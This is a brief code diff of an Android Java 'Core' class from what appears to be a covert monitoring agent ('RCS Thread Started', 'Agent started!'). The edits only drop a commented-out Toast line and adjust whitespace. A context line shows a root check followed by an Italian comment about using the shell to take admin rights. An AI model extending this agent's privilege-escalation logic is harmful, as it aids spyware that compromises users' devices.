@@ -176,7 +176,6 @@ public class Core extends Activity implements Runnable {
 
 		if (Cfg.DEMO) {
 			Status.self().makeToast(M.e("Agent started!"));
-			//Toast.makeText(Status.getAppContext().getApplicationContext(), M.e("Agent started!"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 		}
 
 		return true;
@@ -227,7 +226,7 @@ public class Core extends Activity implements Runnable {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " RCS Thread Started"); //$NON-NLS-1$
 			// startTrace();
-		}
+		}	
 
 		if (PackageInfo.checkRoot()) {
 			// Usa la shell per prendere l'admin
